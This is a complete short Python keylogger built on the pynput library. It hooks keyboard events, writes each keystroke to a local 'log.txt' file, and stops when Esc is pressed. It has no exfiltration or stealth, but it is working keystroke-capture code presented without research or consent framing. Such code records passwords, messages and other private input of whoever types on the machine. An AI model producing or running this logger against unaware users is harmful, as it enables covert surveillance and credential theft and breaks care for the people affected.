from pynput.keyboard import Key, Listener

key_log = []
key_log_count = 0

def on_key_press(key):
   global key_log, key_log_count

   key_log.append(key)
   key_log_count += 1

   if key_log_count == 1:   # For every key pressed, key log is stored in file
      key_log_count = 0
      write_to_file(key_log)
      key_log = []

def on_key_release(key):
   if key == Key.esc:
      return False

def write_to_file(key_log):
   with open("log.txt", 'a') as f:
      for key in key_log:
         k = str(key).replace("'", " ")

         if k.find("space") > 0:
            f.write('\t')
         elif k.find("Key") == -1:
            f.write(k)

with Listener(on_press = on_key_press, on_release = on_key_release) as listener:
   listener.join()

